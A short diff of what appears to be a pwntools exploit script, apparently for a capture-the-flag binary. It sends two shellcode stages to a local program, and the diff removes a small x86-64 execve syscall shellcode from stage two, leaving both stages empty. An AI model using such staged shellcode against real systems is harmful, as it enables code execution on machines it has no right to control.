@@ -383,7 +383,7 @@ p = process('./program')
 # ==========================================
 stage1 = asm("""
     
-""")
+    """)
 
 log.info(f"Gui Stage 1: {stage1.hex()}")
 p.send(stage1)
@@ -399,15 +399,8 @@ sleep(0.5)
 padding = asm("nop") * 1
 
 real_shellcode = asm("""
-    push 59
-    pop rax
-    push 0x61
-    push rsp
-    pop rdi
-    cdq
-    xor esi, esi
-    syscall
-""")
+    
+    """)
 
 stage2 = padding + real_shellcode
 log.info(f"Gui Stage 2 ({len(stage2)} bytes)...")
